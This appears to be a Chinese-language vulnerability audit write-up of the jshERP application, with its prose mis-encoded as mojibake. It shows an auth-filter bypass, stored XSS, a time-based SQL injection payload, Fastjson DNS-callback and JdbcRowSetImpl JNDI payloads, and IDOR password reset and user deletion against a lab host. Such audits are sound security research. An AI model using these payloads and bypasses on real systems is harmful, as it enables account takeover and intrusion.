QueryUtils.rows(map));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†<code>com.jsh.erp.service.account.AccountService#select</code>ï¼Œæ¥ç€ctrl+é¼ æ ‡å·¦é”®<code>select</code>æ–¹æ³•å°±çœ‹åˆ°åˆ°äº†daoå±‚ï¼Œè¿›è¡ŒçœŸæ­£çš„æ•°æ®å¤„ç†ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯æ¯ä¸ª<code>Component</code>ç±»(è¿™é‡Œä»¥AccountComponentä¸¾ä¾‹ï¼‰çš„<code>@AccountResource</code>æ³¨è§£å°†<code>@ResourceInfo(value = &quot;account&quot;)</code>å’Œ<code>com.jsh.erp.service.account.AccountComponent</code>ç»‘å®šï¼Œåœ¨<code>InterfaceContainer</code>ç±»ä¸­Spring å¯åŠ¨æ—¶ä¼šæ‰«ææ‰€æœ‰å®ç°äº† <code>ICommonQuery</code> æ¥å£çš„ç»„ä»¶ã€‚é€šè¿‡åå°„è¯»å–æ¯ä¸ªç»„ä»¶ä¸Šçš„ <code>@ResourceInfo</code> æ³¨è§£çš„ <code>value</code> å€¼ï¼Œå°†å…¶ä½œä¸ºé”®ï¼ˆ<code>apiName</code>ï¼‰ï¼Œç»„ä»¶å®ä¾‹ä½œä¸ºå€¼ï¼Œå­˜å…¥ <code>configComponentMap</code>ã€‚å½“æˆ‘ä»¬è®¿é—®æ¥å£ï¼Œæ¯”å¦‚ï¼š<code>GET /account/list</code>ã€‚åœ¨ <code>Controller</code> ä¸­ï¼Œ<code>apiName</code> ä»è·¯å¾„å‚æ•°ä¸­è§£æå‡ºæ¥ï¼ˆ<code>@PathVariable(&quot;apiName&quot;)</code>ï¼‰ï¼Œå€¼ä¸º <code>&quot;account&quot;</code>ã€‚<code>CommonQueryManager</code> å°† <code>apiName</code> ä¼ é€’ç»™ <code>InterfaceContainer</code>ã€‚<code>InterfaceContainer</code> ä½¿ç”¨ <code>configComponentMap.get(apiName)</code> æŸ¥æ‰¾å¯¹åº”çš„ç»„ä»¶å®ä¾‹ï¼Œæ‰¾åˆ° <code>AccountComponent</code>ã€‚è°ƒç”¨å…¶ <code>select</code> æ–¹æ³•ï¼Œæ‰§è¡Œå¯¹åº”çš„ä¸šåŠ¡é€»è¾‘ã€‚</p>
<p>æ•°æ®æµï¼š</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><code class="hljs xl">HTTP è¯·æ±‚ -&gt; R<span class="hljs-function"><span class="hljs-title">esourceController</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-title">ommonQueryManager</span> -&gt;</span> I<span class="hljs-function"><span class="hljs-title">nterfaceContainer</span> -&gt;</span> IC<span class="hljs-function"><span class="hljs-title">ommonQuery</span> å®ç°ç±» -&gt;</span> DAO å±‚ -&gt; æ•°æ®åº“<br></code></pre></td></tr></table></figure>

<h1 id="æœªæˆæƒè®¿é—®"><a href="#æœªæˆæƒè®¿é—®" class="headerlink" title="æœªæˆæƒè®¿é—®"></a>æœªæˆæƒè®¿é—®</h1><p>é˜…è¯»filterä»£ç æˆ‘ä»¬å‘ç°åŠ äº†ç™½ï¼Œå¯¹åº”çš„èµ„æºåŠ ç™½åœ¨ <code>ignoredUrl</code> ä¸­ï¼Œä»¥ <code>#</code> åˆ†å‰²ï¼Œçœ‹ä¼¼æ²¡ä»€ä¹ˆé—®é¢˜ï¼›è¿˜æœ‰å¯¹åº”çš„ Path åŠ ç™½ï¼ŒåŠ äº† <code>/user/login</code>ï¼Œ<code>/user/registerUser</code> ä»¥åŠ <code>/v2/api-docs</code>ã€‚</p>
<p>å¯¹äºåŠ ç™½çš„æ€ç´¢ï¼šæ˜¯å¦ä¼šå­˜åœ¨æ½œåœ¨çš„æœªæˆæƒè®¿é—®ï¼Ÿå¯¹äºèµ„æºåŠ ç™½ â€”â€”â€”â€” <code>ignoredList</code> çš„åˆ¤æ–­åªæ˜¯è¿›è¡Œäº†æ­£åˆ™çš„åˆ¤æ–­ï¼Œè¿™å¹¶ä¸ç¬¦åˆå¼€å‘çš„å®‰å…¨æ€§ï¼Œæ­£ç¡®çš„å†™æ³•åº”è¯¥ä½¿ç”¨ <code>endsWith()</code> æ¥åˆ¤æ–­ URL æ˜¯å¦ä»¥ <code>.css</code>ï¼›<code>.js</code> ç­‰èµ„æºåç¼€ç»“å°¾</p>
<p>æˆ‘ä»¬å»æ‰¾Controllerï¼ˆä¸Šé¢åœ¨ä»‹ç»å¸¸è§é¡¹ç›®ç»“æ„çš„æ—¶å€™ä¹Ÿä»‹ç»è¿‡äº†ï¼ŒControlleræ˜¯JavaWebçš„å…¥å£ç‚¹ï¼‰ã€‚</p>
<p>ç›´æ¥ä½¿ç”¨<code>.css|.js|.jpg|.png|.gif|.ico</code>ç»•è¿‡</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022111405315.png" alt="image-20241022111405315"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022111454313.png" alt="image-20241022111454313"></p>
<p>è¿™ä¸ªæ¥å£èƒ½çœ‹åˆ°æ‰€æœ‰çš„ä¿¡æ¯</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250101203233135.png" alt="image-20250101203233135"></p>
<p>å¯¹äº URL åŠ ç™½çš„æ€è€ƒï¼šä½¿ç”¨ <code>startsWith()</code> æ–¹æ³•æ¥åˆ¤æ–­ URL æ˜¯å¦æ˜¯ç™½åå•å¼€å¤´çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ç›®å½•ç©¿è¶Šæ¥éª—è¿‡åˆ¤æ–­ï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡è®¤è¯è¯·æ±‚ã€‚<img src="https://image.sp4rks.xyz/2025/01/image-20241211214031549.png" alt="image-20241211214031549"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022122917387.png" alt="image-20241022122917387"></p>
<h1 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h1><p>å…¶å®ä¹‹å‰åœ¨çœ‹filterçš„æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å‘ç°ï¼Œå¹¶æ²¡æœ‰åšè¿‡æ»¤ã€‚æˆ‘å¹³å¸¸çš„ä¹ æƒ¯ä¹Ÿå°±æ˜¯è§æ¡†å°±x</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022194258135.png" alt="image-20241022194258135"></p>
<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><p>å› ä¸ºç»„ä»¶æ˜¯Mybatisï¼ŒSQLæ³¨å…¥åœ¨Mybatisæ¡†æ¶ä¸‹ä¸€èˆ¬å¯»æ‰¾mapperä¸‹çš„xmlæ–‡ä»¶ä¸­çš„<code>$&#123;&#125;ã€likeã€inã€order by</code>ï¼Œå› ä¸º<code>$&#123;&#125;</code>æ˜¯å­—ç¬¦ä¸²æ›¿æ¢æ„æ€å°±æ˜¯å’±ä»¬è¾“å…¥çš„å­—ç¬¦å¯ä»¥ç›´æ¥ä½œä¸ºsqlçš„æŸ¥è¯¢è¯­å¥ï¼Œ<code>like in order by</code> ä¸èƒ½è¿›è¡Œé¢„ç¼–è¯‘ï¼Œåœ¨è¿‡æ»¤ä¸ä¸¥çš„æƒ…å†µä¸‹ä¹Ÿæœ‰å¯èƒ½å¯¼è‡´sqlæ³¨å…¥ã€‚</p>
<p><code>åœ¨mapper_xmlæ–‡ä»¶ ctrl+shift+f æœç´¢$&#123;</code> </p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022123722647.png" alt="image-20241022123722647"></p>
<p>ç„¶åå°±åˆ°äº†è¿™é‡Œï¼Œè¿™æ—¶å€™æ’ä»¶çš„å¥½å¤„å°±æ¥äº†ï¼Œctrl+é¼ æ ‡å·¦é”®ç‚¹å‡»è“è‰²çš„å°é¸Ÿ</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022124121138.png" alt="image-20241022124121138"></p>
<p>ç›´æ¥è·³è½¬åˆ°å¯¹åº”çš„æ¥å£æ–¹æ³•<code>com.jsh.erp.datasource.mappers.UserMapperEx#selectByConditionUser</code>ï¼Œç„¶åctrl+é¼ æ ‡å·¦é”®æ‰¾ä¸Šå±‚è°ƒç”¨<img src="https://image.sp4rks.xyz/2025/01/image-20241022160028086.png" alt="image-20241022160028086"></p>
<p>ç„¶åå°±æ‰¾åˆ°äº†<code>com.jsh.erp.service.user.UserService#select</code> ç»§ç»­å¾€ä¸Šæ‰¾</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022155725036.png" alt="image-20241022155725036"></p>
<p>æŒ‰ä½<code>CTRL+é¼ æ ‡å·¦é”®</code>ç„¶åç‚¹å‡»å‡½æ•°ï¼Œå³å¯çœ‹åˆ°è°ƒç”¨ä½ç½®ä¸º<code>com.jsh.erp.service.user.UserComponent#getUserList</code></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„<code>username</code>å’Œ<code>password</code>æ˜¯ç›´æ¥é€šè¿‡<code>com.jsh.erp.utils.StringUtil#getInfo</code>å‡½æ•°è·å–åˆ°çš„</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022160936325.png" alt="image-20241022160936325"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†<code>fastjson</code>ä¸­çš„<code>com.alibaba.fastjson.JSON#parseObject(java.lang.String)</code>æ–¹æ³•ï¼Œå»è§£æä¸€ä¸ªå˜é‡å«åš<code>search</code></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022161209094.png" alt="image-20241022161209094"></p>
<p>è¿˜æ˜¯æ²¡æœ‰åˆ°Controllerå±‚ï¼Œç»§ç»­Ctrl+Bï¼Œæ¥åˆ°<code>com.jsh.erp.service.CommonQueryManager</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(apiName)) &#123;<br>        <span class="hljs-keyword">return</span> container.getCommonQuery(apiName).select(parameterMap);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç»§ç»­å¾€ä¸Šï¼Œç»ˆäºæ¥åˆ°<code>ResourceController</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>    parameterMap.put(Constants.SEARCH, search);<br>    <span class="hljs-type">PageQueryInfo</span> <span class="hljs-variable">queryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryInfo</span>();<br>    Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>    <span class="hljs-keyword">if</span> (pageSize != <span class="hljs-literal">null</span> &amp;&amp; pageSize &lt;= <span class="hljs-number">0</span>) &#123;<br>        pageSize = <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> ParamUtils.getPageOffset(currentPage, pageSize);<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(offset)) &#123;<br>        parameterMap.put(Constants.OFFSET, offset);<br>    &#125;<br>    List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);<br><br>    objectMap.put(<span class="hljs-string">&quot;page&quot;</span>, queryInfo);<br>    <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>        queryInfo.setRows(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;());<br>        queryInfo.setTotal(BusinessConstants.DEFAULT_LIST_NULL_NUMBER);<br>        <span class="hljs-keyword">return</span> returnJson(objectMap, <span class="hljs-string">&quot;æŸ¥æ‰¾ä¸åˆ°æ•°æ®&quot;</span>, ErpInfo.OK.code);<br>    &#125;<br>    queryInfo.setRows(list);<br>    queryInfo.setTotal(configResourceManager.counts(apiName, parameterMap));<br>    <span class="hljs-keyword">return</span> returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡å‰é¢çš„è·¯ç”±åˆ†æå¯çŸ¥ï¼Œè¿™é‡Œçš„apinameä¸ºuser</p>
<p>æ­£å‘æ•°æ®é“¾ï¼š</p>
<p>&#x2F;user&#x2F;listâ€”â€”&gt;ResourceController.getListâ€”â€”&gt;CommonQueryManager.selectâ€”â€”&gt;UserComponent.selectâ€”â€”&gt;UserComponent.getUserListâ€”â€”&gt;UserService.selectâ€”â€”&gt;UserMapperEx.selectByConditionUserâ€”â€”&gt;UserMapperEx.xmlä¸­idä¸ºselectByConditionUserçš„æŸ¥è¯¢</p>
<p>åŒæ ·çš„é“ç†ï¼Œåœ¨è¿™ä¸ªgetListæ–¹æ³•ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªselectæŸ¥è¯¢ï¼Œå¯¹åº”çš„æ•°æ®é“¾ï¼š</p>
<p>&#x2F;user&#x2F;listâ€”â€”&gt;ResourceController.getListâ€”â€”&gt;CommonQueryManager.countsâ€”â€”&gt;UserComponent.countsâ€”â€”&gt;UserService.countUserâ€”â€”&gt;UserMapperEx.countsByUserâ€”â€”&gt;UserMapperEx.xmlä¸­idä¸ºcountsByUserçš„æŸ¥è¯¢</p>
<p>è§¦å‘é¡µé¢</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022162217123.png" alt="image-20241022162217123"></p>
<p>æŠ“ä¸ªåŒ…å¯ä»¥çœ‹åˆ°ç¡®å®æœ‰userNameã€loginNameå‚æ•°</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022162425354.png" alt="image-20241022162425354"></p>
<p>æˆ‘ä»¬å¯ä»¥ç›´æ¥æ¥éªŒè¯ä¸€ä¸‹</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;userName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;loginName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&#x27; AND SLEEP(5)--+&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022172143088.png" alt="image-20241022172143088"></p>
<h1 id="Fastjsonæ¼æ´"><a href="#Fastjsonæ¼æ´" class="headerlink" title="Fastjsonæ¼æ´"></a>Fastjsonæ¼æ´</h1><p>åˆšå¼€å§‹æˆ‘ä»¬çœ‹ç»„ä»¶çš„æ—¶å€™å°±å‘ç°è¿™ä¸ªfastjsonæ˜¯æœ‰æ¼æ´çš„ç‰ˆæœ¬ï¼Œä¸”åœ¨ä¸Šé¢sqlæ³¨å…¥åˆ†æçš„æ—¶å€™å°±å‘ç°<code>com.jsh.erp.utils.StringUtil#getInfo</code>ä½¿ç”¨äº†fastjson</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>     <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>     <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>         <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>         value = obj.getString(key);<br>         <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>             value = <span class="hljs-literal">null</span>;<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">return</span> value;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>è¯¦ç»†åˆ©ç”¨å¯ä»¥çœ‹<a href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p>
<p>å½“æˆ‘ä»¬ä¸çŸ¥é“å…·ä½“ç‰ˆæœ¬çš„æƒ…å†µä¸‹åˆ©ç”¨ä¸‹é¢çš„ä»£ç æ¢æµ‹ç‰ˆæœ¬</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102153651813.png" alt="image-20250102153651813"></p>
<p>è™½ç„¶è¿™é‡Œæ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯å…¶å®æŠ¥é”™å·²ç»æœ‰äº†ç‰ˆæœ¬</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102153719821.png" alt="image-20250102153719821"></p>
<p>ä½¿ç”¨{â€œ@typeâ€:â€java.net.Inet4Addressâ€,â€valâ€:â€01z8zqebq8y495se6ypru6f08rei2ez2o.oastify.comâ€}æ¢æµ‹ä¸€ä¸‹</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022191119014.png" alt="image-20241022191119014"></p>
<p>å¯ä»¥çœ‹åˆ°DNSæ˜¯æœ‰è®°å½•çš„ï¼Œè¯æ˜å­˜åœ¨ Fastjson æ¼æ´ï¼Œç„¶åæˆ‘ä»¬è¿›ä¸€æ­¥æ„é€  payloadã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022191128135.png" alt="image-20241022191128135"></p>
<p>ä½¿ç”¨<a href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus</a></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102154143186.png" alt="image-20250102154143186"></p>
<p>æ„é€ </p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://localhost:1099/remoteExploit8&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102154450060.png" alt="image-20250102154450060"></p>
<p>ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°<code>autoType</code>æ²¡æœ‰å¼€å¯</p>
<h1 id="è¶Šæƒ"><a href="#è¶Šæƒ" class="headerlink" title="è¶Šæƒ"></a>è¶Šæƒ</h1><h2 id="é‡ç½®å¯†ç "><a href="#é‡ç½®å¯†ç " class="headerlink" title="é‡ç½®å¯†ç "></a>é‡ç½®å¯†ç </h2><p>jshè´¦æˆ·æœ‰é‡ç½®å¯†ç çš„æƒé™ï¼Œç™»å½•jshè´¦æˆ·æŠ“ä¸€ä¸ªé‡ç½®å¯†ç çš„åŒ…</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102143357584.png" alt="image-20250102143357584"></p>
<p>æ™®é€šè´¦æˆ·æ²¡æœ‰é‡ç½®å¯†ç çš„åŠŸèƒ½ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœªæˆæƒè®¿é—®ä¸­çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ™®é€šç”¨æˆ·æ„é€ å¦‚ä¸‹æ•°æ®åŒ…æ¥è¶Šæƒä¿®æ”¹ä»–äººçš„å¯†ç ä¸ºåˆå§‹å¯†ç <code>123456</code>ï¼Œæˆ‘ä»¬å…ˆç™»å½•ç”¨æˆ·<code>jsh</code>&#x2F;<code>123456</code>ï¼Œç„¶åæŠ“åŒ…æ”¹åŒ…ä¸ºå¦‚ä¸‹å†…å®¹(æ³¨æ„è¿™é‡Œåˆ é™¤cookieï¼Œè¿™æ ·å°±æ˜¯åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹é‡ç½®ä»–äººçš„å¯†ç )ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102150407547.png" alt="image-20250102150407547"></p>
<p>å¯ä»¥çœ‹åˆ°å¯†ç ä¿®æ”¹æˆåŠŸäº†</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102150722194.png" alt="image-20250102150722194"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102143432284.png" alt="image-20250102143432284"></p>
<p>è®©æˆ‘ä»¬è·Ÿè¿›ä»£ç é€»è¾‘çœ‹çœ‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@PostMapping(value = &quot;/resetPwd&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">resetPwd</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;id&quot;)</span> Long id,</span><br><span class="hljs-params">                                     HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123456&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">md5Pwd</span> <span class="hljs-operator">=</span> Tools.md5Encryp(password);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">update</span> <span class="hljs-operator">=</span> userService.resetPwd(md5Pwd, id);<br>        <span class="hljs-keyword">if</span>(update &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> returnJson(objectMap, message, ErpInfo.OK.code);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> returnJson(objectMap, message, ErpInfo.ERROR.code);<br>        &#125;<br>    &#125;<br><br><br><br>com.jsh.erp.service.user.UserService#resetPwd    <br>     <span class="hljs-meta">@Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">resetPwd</span><span class="hljs-params">(String md5Pwd, Long id)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        logService.insertLog(<span class="hljs-string">&quot;ç”¨æˆ·&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(BusinessConstants.LOG_OPERATION_TYPE_EDIT).append(id).toString(),<br>                ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> getUser(id);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">loginName</span> <span class="hljs-operator">=</span> u.getLoginName();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>.equals(loginName))&#123;<br>            logger.info(<span class="hljs-string">&quot;ç¦æ­¢é‡ç½®è¶…ç®¡å¯†ç &quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            user.setId(id);<br>            user.setPassword(md5Pwd);<br>            <span class="hljs-keyword">try</span>&#123;<br>                result=userMapper.updateByPrimaryKeySelective(user);<br>            &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>                JshException.writeFail(logger, e);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure>



<p><img src="https://image.sp4rks.xyz/2025/01/image-20241216142220808.png" alt="image-20241216142220808"></p>
<p>å¯ä»¥çœ‹åˆ°å†™çš„éå¸¸ç®€å•ï¼Œé™¤äº†adminç”¨æˆ·çš„å¯†ç ä¸èƒ½æ›´æ”¹ï¼Œå…¶ä»–çš„éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ›´æ”¹ã€‚å¯ä»¥ç»“åˆå‰é¢çš„æœªæˆæƒè®¿é—®ç»¼åˆåˆ©ç”¨ã€‚</p>
<h2 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h2><p>ç™»å½•è‡ªå·±çš„ç”¨æˆ·æŠ“ä¸€ä¸ªä¿®æ”¹å¯†ç çš„åŒ…</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102132756709.png" alt="image-20250102132756709"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">POST /user/updatePwd HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.66</span><span class="hljs-number">.71</span>:<span class="hljs-number">8081</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">133.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">133.0</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 39</span><br><span class="hljs-comment">Origin: http://192.168.66.71:8081</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.66.71:8081/pages/user/password.html</span><br><span class="hljs-comment">Cookie: JSESSIONID=37852FF6DA4CF637247A0462EDEAF2BD</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">userId=137&amp;password=44444&amp;oldpwd=123456</span><br></code></pre></td></tr></table></figure>

<p>æˆ‘è¿™ä¸ªç”¨æˆ·çš„idæ˜¯137ï¼Œå½“æˆ‘æŠŠidæ”¹ä¸º138ä¹Ÿæ˜¯æˆåŠŸäº†</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102142750571.png" alt="image-20250102142750571"></p>
<p>å®æˆ˜åœºæ™¯ä¸‹ï¼Œå¯ä»¥çœ‹æœ‰æ²¡æœ‰ç”¨æˆ·æ²¡æœ‰ä¿®æ”¹é»˜è®¤å¯†ç çš„ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102140930464.png" alt="image-20250102140930464"></p>
<h2 id="åˆ é™¤ç”¨æˆ·"><a href="#åˆ é™¤ç”¨æˆ·" class="headerlink" title="åˆ é™¤ç”¨æˆ·"></a>åˆ é™¤ç”¨æˆ·</h2><p>æˆ‘ä»¬å…ˆç”¨ admin çš„è´¦æˆ·æŠ“ä¸€ä¸ª <code>deleteUser</code> çš„åŒ…</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151156587.png" alt="image-20250102151156587"></p>
<p>å¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼ç»•è¿‡(åˆ é™¤cookie)</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151212376.png" alt="image-20250102151212376"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151254729.png" alt="image-20250102151254729"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250102151518564.png" alt="image-20250102151518564"></p>
